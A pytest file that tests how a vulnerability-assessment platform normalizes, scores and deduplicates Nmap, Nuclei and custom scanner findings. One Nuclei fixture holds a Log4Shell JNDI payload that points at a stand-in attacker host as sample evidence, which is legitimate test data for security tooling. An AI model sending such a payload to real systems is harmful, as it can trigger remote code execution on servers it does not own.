"""Tests for the canonical finding normalization layer (M2).

These tests verify:
1. Nmap-derived finding normalization
2. Nuclei-derived finding normalization
3. Custom finding normalization
4. Required fields
5. Optional fields
6. Missing optional fields
7. Malformed input
8. Empty input
9. Severity normalization
10. Source preservation
11. Target preservation
12. Port/protocol preservation
13. Deterministic asset identity
14. Deterministic deduplication
"""
from __future__ import annotations

import pytest

from vapt_platform.normalization import (
    CanonicalFinding,
    SEVERITY_LEVELS,
    asset_identity,
    deduplicate,
    finding_identity,
    normalize_custom_findings,
    normalize_findings,
    normalize_nmap_findings,
    normalize_nuclei_findings,
    canonical_to_candidates,
    normalize_severity,
    cvss_score_to_severity,
)
from vapt_platform.parsers.nuclei_parser import NucleiFinding


# ---------------------------------------------------------------------------
# Fixtures - Nmap test data
# ---------------------------------------------------------------------------

@pytest.fixture
def nmap_xml_raw():
    """Raw Nmap XML output structure (dict from parse_nmap_xml)."""
    return [
        {
            "host": "192.168.1.10",
            "port": 22,
            "service": "ssh",
            "description": "OpenSSH 8.9p1",
            "cpe": ["cpe:/a:openssh:openssh:8.9p1"],
            "cve": None,
        },
        {
            "host": "192.168.1.10",
            "port": 80,
            "service": "http",
            "description": "Apache httpd 2.4.54",
            "cpe": ["cpe:/a:apache:http_server:2.4.54"],
            "cve": "CVE-2023-25690",
        },
        {
            "host": "192.168.1.20",
            "port": 3306,
            "service": "mysql",
            "description": "MySQL 5.7.38",
            "cpe": ["cpe:/a:mysql:mysql:5.7.38"],
            "cve": "CVE-2023-21977",
        },
    ]


@pytest.fixture
def nmap_json_raw():
    """Raw Nmap JSON output structure (dict from parse_nmap_json)."""
    return [
        {
            "host": "10.0.0.10",
            "port": 22,
            "service": "ssh",
            "description": "OpenSSH 8.9p1",
            "cve": "CVE-2023-38408",
        },
        {
            "host": "10.0.0.10",
            "port": 80,
            "service": "http",
            "description": "Apache httpd 2.4.54",
            "cve": None,
        },
    ]


# ---------------------------------------------------------------------------
# Fixtures - Nuclei test data
# ---------------------------------------------------------------------------

@pytest.fixture
def nucleis_finding():
    """A single NucleiFinding object."""
    return NucleiFinding(
        template_id="CVE-2021-44228",
        name="Apache Log4j2 Remote Code Execution",
        severity="critical",
        type="http",
        host="example.com",
        target="https://example.com/api",
        ip="1.2.3.4",
        matched_at="https://example.com/api",
        matcher_name="log4j",
        extracted_results=["${jndi:ldap://evil.com/a}"],
        tags=["cve", "rce", "log4j"],
        description="Log4j RCE vulnerability in Apache",
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
        cve_ids=["CVE-2021-44228"],
        cvss_score=10.0,
        cvss_metrics="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        cwe_ids=["CWE-502"],
        timestamp="2024-01-01T00:00:00Z",
        curl_command="curl -X GET https://example.com/api",
        matcher_status=True,
        error_message=None,
        raw={"template-id": "CVE-2021-44228"},
    )


@pytest.fixture
def nucleis_findings():
    """A list of NucleiFinding objects."""
    return [
        NucleiFinding(
            template_id="CVE-2021-44228",
            name="Apache Log4j2 RCE",
            severity="critical",
            type="http",
            host="example.com",
            target="https://example.com/api",
            description="Log4j vulnerability",
            cve_ids=["CVE-2021-44228"],
            cvss_score=10.0,
            raw={},
        ),
        NucleiFinding(
            template_id="CVE-2023-38408",
            name="OpenSSH RCE",
            severity="high",
            type="tcp",
            host="10.0.0.1",
            target="10.0.0.1",
            description="OpenSSH vulnerability",
            cve_ids=["CVE-2023-38408"],
            raw={},
        ),
    ]


# ---------------------------------------------------------------------------
# Fixtures - Custom test data
# ---------------------------------------------------------------------------

@pytest.fixture
def custom_json_raw():
    """Raw custom JSON output structure (dict from parse_custom_json)."""
    return [
        {
            "host": "10.0.0.0/24",
            "port": 22,
            "service": "ssh",
            "cve": "CVE-2023-38408",
            "description": "OpenSSH PKCS#11 Remote Code Execution",
        },
        {
            "host": "10.0.0.0/24",
            "port": 8080,
            "service": "http-proxy",
            "cve": "CVE-2023-28708",
            "description": "Apache Tomcat HTTP Request Smuggling",
        },
    ]


# ---------------------------------------------------------------------------
# Test: Required fields
# ---------------------------------------------------------------------------

class TestRequiredFields:
    """Test that required fields are properly populated."""

    def test_finding_id_present(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        for f in findings:
            assert f.finding_id, "finding_id must be present"
            assert isinstance(f.finding_id, str)

    def test_source_present(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        for f in findings:
            assert f.source == "nmap"

    def test_target_present(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        for f in findings:
            assert f.target, "target must be present"

    def test_host_present(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        for f in findings:
            assert f.host, "host must be present"

    def test_port_present_for_open_ports(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        assert findings[0].port == 22
        assert findings[1].port == 80
        assert findings[2].port == 3306

    def test_title_present(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        for f in findings:
            assert f.title, "title must be present"

    def test_severity_default_unknown(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        for f in findings:
            assert f.severity == "unknown", "Nmap findings default to unknown severity"


# ---------------------------------------------------------------------------
# Test: Nmap normalization
# ---------------------------------------------------------------------------

class TestNmapNormalization:
    """Test Nmap-derived finding normalization."""

    def test_simple_nmap_finding(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw[:1])
        assert len(findings) == 1
        f = findings[0]
        assert f.host == "192.168.1.10"
        assert f.port == 22
        assert f.source == "nmap"
        assert f.protocol == "tcp"

    def test_nmap_finding_with_cve(self, nmap_json_raw):
        findings = normalize_nmap_findings(nmap_json_raw)
        f = findings[0]
        assert f.template_or_rule_id == "CVE-2023-38408"
        assert "CVE-2023-38408" in f.cve_ids

    def test_nmap_finding_without_cve(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw[:1])
        f = findings[0]
        assert f.cve_ids[0] if f.cve_ids else None is None
        assert f.template_or_rule_id is None
        assert "none" in f.finding_id

    def test_nmap_cpe_becomes_evidence(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        for f in findings:
            assert len(f.evidence) >= 1, "CPE should be in evidence"

    def test_nmap_service_in_metadata(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        for f in findings:
            assert "service" in f.metadata
            assert f.metadata["service"] in ["ssh", "http", "mysql"]

    def test_nmap_finding_id_deterministic(self, nmap_xml_raw):
        findings1 = normalize_nmap_findings(nmap_xml_raw)
        findings2 = normalize_nmap_findings(nmap_xml_raw)
        for f1, f2 in zip(findings1, findings2):
            assert f1.finding_id == f2.finding_id


# ---------------------------------------------------------------------------
# Test: Nuclei normalization
# ---------------------------------------------------------------------------

class TestNucleiNormalization:
    """Test Nuclei-derived finding normalization."""

    def test_simple_nuclei_finding(self, nucleis_finding):
        findings = normalize_nuclei_findings([nucleis_finding])
        assert len(findings) == 1
        f = findings[0]
        assert f.source == "nuclei"
        assert f.template_or_rule_id == "CVE-2021-44228"
        assert f.title == "Apache Log4j2 Remote Code Execution"
        assert f.severity == "critical"

    def test_nuclei_severity_normalized(self, nucleis_finding):
        findings = normalize_nuclei_findings([nucleis_finding])
        assert findings[0].severity in SEVERITY_LEVELS

    def test_nuclei_port_extracted_from_https(self, nucleis_finding):
        findings = normalize_nuclei_findings([nucleis_finding])
        assert findings[0].port == 443, "HTTPS URL should default to port 443"

    def test_nuclei_protocol_from_type(self, nucleis_findings):
        findings = normalize_nuclei_findings(nucleis_findings)
        assert findings[0].protocol == "http"
        assert findings[1].protocol == "tcp"

    def test_nuclei_evidence_from_extracted_results(self, nucleis_finding):
        findings = normalize_nuclei_findings([nucleis_finding])
        assert len(findings[0].evidence) > 0

    def test_nuclei_cve_ids_preserved(self, nucleis_finding):
        findings = normalize_nuclei_findings([nucleis_finding])
        assert "CVE-2021-44228" in findings[0].cve_ids

    def test_nuclei_cvss_preserved(self, nucleis_finding):
        findings = normalize_nuclei_findings([nucleis_finding])
        assert findings[0].cvss_score == 10.0
        assert findings[0].cvss_metrics is not None

    def test_nuclei_target_is_matched_at(self, nucleis_finding):
        findings = normalize_nuclei_findings([nucleis_finding])
        assert findings[0].target == "https://example.com/api"

    def test_nuclei_finding_id_deterministic(self, nucleis_findings):
        findings1 = normalize_nuclei_findings(nucleis_findings)
        findings2 = normalize_nuclei_findings(nucleis_findings)
        for f1, f2 in zip(findings1, findings2):
            assert f1.finding_id == f2.finding_id


# ---------------------------------------------------------------------------
# Test: Custom normalization
# ---------------------------------------------------------------------------

class TestCustomNormalization:
    """Test custom JSON-derived finding normalization."""

    def test_simple_custom_finding(self, custom_json_raw):
        findings = normalize_custom_findings(custom_json_raw)
        assert len(findings) == 2
        f = findings[0]
        assert f.source == "custom"
        assert f.host == "10.0.0.0/24"
        assert f.port == 22
        assert f.template_or_rule_id == "CVE-2023-38408"

    def test_custom_finding_id_deterministic(self, custom_json_raw):
        findings1 = normalize_custom_findings(custom_json_raw)
        findings2 = normalize_custom_findings(custom_json_raw)
        for f1, f2 in zip(findings1, findings2):
            assert f1.finding_id == f2.finding_id


# ---------------------------------------------------------------------------
# Test: Optional fields
# ---------------------------------------------------------------------------

class TestOptionalFields:
    """Test that optional fields are handled correctly."""

    def test_description_optional(self):
        findings = normalize_nmap_findings([{"host": "1.1.1.1", "port": 80}])
        f = findings[0]
        assert f.description is None

    def test_cve_ids_optional(self, nmap_xml_raw):
        findings = normalize_nmap_findings([nmap_xml_raw[0]])
        f = findings[0]
        assert f.cve_ids == []

    def test_cvss_score_optional(self, nucleis_finding):
        f = NucleiFinding(
            template_id="TEST-001",
            name="Test Finding",
            severity="high",
            type="tcp",
            host="127.0.0.1",
        )
        findings = normalize_nuclei_findings([f])
        assert findings[0].cvss_score is None

    def test_metadata_populated(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        for f in findings:
            assert isinstance(f.metadata, dict)


# ---------------------------------------------------------------------------
# Test: Missing optional fields
# ---------------------------------------------------------------------------

class TestMissingOptionalFields:
    """Test handling of missing optional fields."""

    def test_nmap_minimal_finding(self):
        raw = {"host": "192.168.1.1", "port": 443}
        findings = normalize_nmap_findings([raw])
        f = findings[0]
        assert f.metadata.get("service") == ""
        assert f.description is None
        assert f.evidence == []

    def test_nuclei_minimal_finding(self):
        f = NucleiFinding(template_id="TEST-001")
        findings = normalize_nuclei_findings([f])
        assert findings[0].title == "Unknown Finding"
        assert findings[0].description is None

    def test_custom_minimal_finding(self):
        raw = {"host": "192.168.1.1"}
        findings = normalize_custom_findings([raw])
        assert findings[0].port is None


# ---------------------------------------------------------------------------
# Test: Severity normalization
# ---------------------------------------------------------------------------

class TestSeverityNormalization:
    """Test severity normalization."""

    def test_normalize_severity_lowercase(self):
        assert normalize_severity("HIGH") == "high"
        assert normalize_severity("Critical") == "critical"
        assert normalize_severity("LOW") == "low"

    def test_normalize_severity_values(self):
        for level in SEVERITY_LEVELS:
            assert normalize_severity(level) == level

    def test_normalize_severity_unknown(self):
        assert normalize_severity("unknown") == "unknown"
        assert normalize_severity(None) == "unknown"
        assert normalize_severity("") == "unknown"
        assert normalize_severity("invalid") == "unknown"

    def test_cvss_to_severity_bounds(self):
        assert cvss_score_to_severity(0.0) == "info"
        assert cvss_score_to_severity(0.1) == "low"
        assert cvss_score_to_severity(4.0) == "medium"
        assert cvss_score_to_severity(7.0) == "high"
        assert cvss_score_to_severity(9.0) == "critical"
        assert cvss_score_to_severity(10.0) == "critical"

    def test_cvss_to_severity_none(self):
        assert cvss_score_to_severity(None) == "unknown"

    def test_cvss_to_severity_invalid(self):
        assert cvss_score_to_severity("invalid") == "unknown"


# ---------------------------------------------------------------------------
# Test: Source preservation
# ---------------------------------------------------------------------------

class TestSourcePreservation:
    """Test that source information is preserved."""

    def test_nmap_source(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        for f in findings:
            assert f.source == "nmap"

    def test_nuclei_source(self, nucleis_findings):
        findings = normalize_nuclei_findings(nucleis_findings)
        for f in findings:
            assert f.source == "nuclei"

    def test_custom_source(self, custom_json_raw):
        findings = normalize_custom_findings(custom_json_raw)
        for f in findings:
            assert f.source == "custom"


# ---------------------------------------------------------------------------
# Test: Target preservation
# ---------------------------------------------------------------------------

class TestTargetPreservation:
    """Test that target information is preserved."""

    def test_nmap_target_equals_host(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        for f in findings:
            assert f.target == f.host

    def test_nuclei_target_may_differ_from_host(self, nucleis_finding):
        findings = normalize_nuclei_findings([nucleis_finding])
        f = findings[0]
        assert f.target == "https://example.com/api"
        assert f.host == "example.com"

    def test_custom_target_equals_host(self, custom_json_raw):
        findings = normalize_custom_findings(custom_json_raw)
        for f in findings:
            assert f.target == f.host


# ---------------------------------------------------------------------------
# Test: Port/protocol preservation
# ---------------------------------------------------------------------------

class TestPortProtocolPreservation:
    """Test that port and protocol are preserved."""

    def test_nmap_port_mapped(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        ports = [f.port for f in findings]
        assert 22 in ports
        assert 80 in ports
        assert 3306 in ports

    def test_nmap_protocol_is_tcp(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        for f in findings:
            assert f.protocol == "tcp"

    def test_nuclei_protocol_from_type(self, nucleis_findings):
        findings = normalize_nuclei_findings(nucleis_findings)
        assert findings[0].protocol == "http"
        assert findings[1].protocol == "tcp"


# ---------------------------------------------------------------------------
# Test: Deterministic asset identity
# ---------------------------------------------------------------------------

class TestDeterministicAssetIdentity:
    """Test deterministic asset identity."""

    def test_asset_identity_format(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        for f in findings:
            expected = f"{f.host}:{f.port}/tcp"
            assert asset_identity(f) == expected

    def test_asset_identity_deterministic(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        for f in findings:
            key1 = asset_identity(f)
            key2 = asset_identity(f)
            assert key1 == key2

    def test_asset_identity_port_none(self):
        f = CanonicalFinding(
            finding_id="test",
            source="test",
            target="example.com",
            host="example.com",
            port=None,
            protocol="tcp",
            title="Test",
        )
        assert "any" in asset_identity(f)


# ---------------------------------------------------------------------------
# Test: Deduplication identity
# ---------------------------------------------------------------------------

class TestDeduplicationIdentity:
    """Test deduplication identity rules."""

    def test_identity_key_components(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        for f in findings:
            key = finding_identity(f)
            assert isinstance(key, str)

    def test_identity_same_cve_same_port(self, nmap_xml_raw):
        f1 = nmap_xml_raw[1]
        findings = normalize_nmap_findings([f1, f1])
        assert finding_identity(findings[0]) == finding_identity(findings[1])

    def test_identity_different_cves_different_keys(self, nmap_json_raw):
        findings = normalize_nmap_findings(nmap_json_raw)
        if len(findings) >= 2:
            assert finding_identity(findings[0]) != finding_identity(findings[1])


# ---------------------------------------------------------------------------
# Test: Deduplication
# ---------------------------------------------------------------------------

class TestDeduplication:
    """Test deduplication behavior."""

    def test_duplicate_findings_merged(self):
        f1 = CanonicalFinding(
            finding_id="test-1",
            source="nmap",
            target="192.168.1.1",
            host="192.168.1.1",
            protocol="tcp",
            title="Apache httpd",
            template_or_rule_id="CVE-2023-25690",
            cve_ids=["CVE-2023-25690"],
            evidence=["cpe:/a:apache:http_server:2.4.54"],
            metadata={"service": "http"},
        )
        f2 = CanonicalFinding(
            finding_id="test-2",
            source="nuclei",
            target="192.168.1.1",
            host="192.168.1.1",
            protocol="tcp",
            title="Apache httpd",
            template_or_rule_id="CVE-2023-25690",
            cve_ids=["CVE-2023-25690"],
            evidence=["additional evidence"],
            metadata={"cvss_score": 7.5},
        )
        results = deduplicate([f1, f2])
        assert len(results) == 1
        merged = results[0]
        assert "additional evidence" in merged.evidence
        assert merged.metadata.get("cvss_score") == 7.5

    def test_non_duplicate_not_merged(self):
        f1 = CanonicalFinding(
            finding_id="test-1",
            source="nmap",
            target="192.168.1.1",
            host="192.168.1.1",
            protocol="tcp",
            title="Apache httpd",
            template_or_rule_id="CVE-2023-25690",
        )
        f2 = CanonicalFinding(
            finding_id="test-2",
            source="nmap",
            target="192.168.1.1",
            host="192.168.1.1",
            protocol="tcp",
            title="Apache https",
            template_or_rule_id="CVE-2023-44307",
        )
        results = deduplicate([f1, f2])
        assert len(results) == 2


# ---------------------------------------------------------------------------
# Test: Bridge to ActionCandidate
# ---------------------------------------------------------------------------

class TestCanonicalToCandidates:
    """Test conversion from CanonicalFinding to ActionCandidate."""

    def test_cve_id_becomes_candidate_id(self, nmap_json_raw):
        findings = normalize_nmap_findings(nmap_json_raw)
        candidates = canonical_to_candidates(findings)
        from decision_engine.core.schemas import ActionCandidate
        for c in candidates:
            assert isinstance(c, ActionCandidate)

    def test_candidate_probability_zero(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        candidates = canonical_to_candidates(findings)
        for c in candidates:
            assert c.probability == 0.0

    def test_candidate_quality_rank_none(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        candidates = canonical_to_candidates(findings)
        for c in candidates:
            assert c.quality_rank is None

    def test_candidate_ground_truth_none(self, nmap_xml_raw):
        findings = normalize_nmap_findings(nmap_xml_raw)
        candidates = canonical_to_candidates(findings)
        for c in candidates:
            assert c.ground_truth is None

    def test_no_cve_uses_finding_id(self):
        f = CanonicalFinding(
            finding_id="nmap|192.168.1.1:80/tcp|none",
            source="nmap",
            target="192.168.1.1",
            host="192.168.1.1",
            protocol="tcp",
            title="OpenSSH",
            template_or_rule_id=None,
        )
        candidates = canonical_to_candidates([f])
        assert candidates[0].id == f.finding_id


# ---------------------------------------------------------------------------
# Test: Unified normalization entry point
# ---------------------------------------------------------------------------

class TestUnifiedNormalization:
    """Test the unified normalize_findings entry point."""

    def test_normalize_nmap(self, nmap_xml_raw):
        findings = normalize_findings(nmap_xml_raw, "nmap")
        assert len(findings) > 0
        assert all(f.source == "nmap" for f in findings)

    def test_normalize_nuclei(self, nucleis_findings):
        findings = normalize_findings(nucleis_findings, "nuclei")
        assert len(findings) > 0
        assert all(f.source == "nuclei" for f in findings)

    def test_normalize_custom(self, custom_json_raw):
        findings = normalize_findings(custom_json_raw, "custom")
        assert len(findings) > 0
        assert all(f.source == "custom" for f in findings)

    def test_unknown_source_raises(self):
        with pytest.raises(ValueError, match="Unknown source"):
            normalize_findings([], "unknown")


# ---------------------------------------------------------------------------
# Test: Empty input
# ---------------------------------------------------------------------------

class TestEmptyInput:
    """Test handling of empty input."""

    def test_empty_nmap_list(self):
        findings = normalize_nmap_findings([])
        assert findings == []

    def test_empty_nuclei_list(self):
        findings = normalize_nuclei_findings([])
        assert findings == []

    def test_empty_custom_list(self):
        findings = normalize_custom_findings([])
        assert findings == []

    def test_empty_to_candidates(self):
        candidates = canonical_to_candidates([])
        assert candidates == []


# ---------------------------------------------------------------------------
# Test: Malformed input
# ---------------------------------------------------------------------------

class TestMalformedInput:
    """Test handling of malformed input."""

    def test_nmap_port_invalid(self):
        raw = {"host": "192.168.1.1", "port": "not-a-number"}
        findings = normalize_nmap_findings([raw])
        f = findings[0]
        assert f.port is None

    def test_nmap_host_missing(self):
        raw = {"port": 80}
        findings = normalize_nmap_findings([raw])
        f = findings[0]
        assert f.host == "unknown"

    def test_canonical_finding_validation(self):
        with pytest.raises(Exception):
            CanonicalFinding()
